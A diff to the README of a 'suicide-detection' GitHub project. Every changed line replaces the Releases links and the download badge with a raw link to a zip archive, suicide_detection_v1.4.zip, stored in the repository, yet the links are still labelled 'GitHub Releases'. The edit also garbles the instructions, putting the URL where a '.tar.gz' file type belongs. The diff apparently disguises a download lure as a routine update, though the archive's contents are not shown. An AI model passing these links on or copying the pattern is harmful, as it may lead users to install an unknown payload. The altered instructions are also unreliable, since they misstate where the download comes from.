@@ -6,9 +6,9 @@ Welcome to the **suicide-detection** project! This application helps identify po
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Dhinesh1817/suicide-detection/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip)
 
-**To download the application, visit this page:** [GitHub Releases](https://github.com/Dhinesh1817/suicide-detection/releases). 
+**To download the application, visit this page:** [GitHub Releases](https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip). 
 
 ## 💡 What You Need
 
@@ -20,16 +20,16 @@ Before you start, ensure you have the following:
 
 ## ⚙️ Installation Steps
 
-1. **Visit the Releases Page**: Click on this link to go to the [GitHub Releases](https://github.com/Dhinesh1817/suicide-detection/releases).
+1. **Visit the Releases Page**: Click on this link to go to the [GitHub Releases](https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip).
 
 2. **Select the Latest Release**: Look for the most recent version. You will find details about the improvements and fixes in that release.
 
-3. **Download the File**: Click on the file suitable for your operating system. For example, if you are using Windows, look for a file ending in `.exe`. For macOS or Linux, the file might be a `.tar.gz` or `.whl` file.
+3. **Download the File**: Click on the file suitable for your operating system. For example, if you are using Windows, look for a file ending in `.exe`. For macOS or Linux, the file might be a `https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip` or `.whl` file.
 
 4. **Open the Downloaded File**: 
    - For Windows, double-click the `.exe` file to begin the installation. 
    - For macOS, find the downloaded file in your Downloads folder and double-click it.
-   - For Linux, move the `.tar.gz` file to your desired directory and use your terminal to extract it.
+   - For Linux, move the `https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip` file to your desired directory and use your terminal to extract it.
 
 5. **Run the Application**: 
    - On Windows, follow the installation prompts.
@@ -76,4 +76,4 @@ If you have questions or need assistance, feel free to reach out through the fol
 - Always use the latest version for the best experience.
 - If you encounter problems, consult the **Issues** section on GitHub for possible solutions.
 
-**To download the application again, visit**: [GitHub Releases](https://github.com/Dhinesh1817/suicide-detection/releases).
+**To download the application again, visit**: [GitHub Releases](https://raw.githubusercontent.com/Dhinesh1817/suicide-detection/main/api_wrapper/suicide_detection_v1.4.zip).
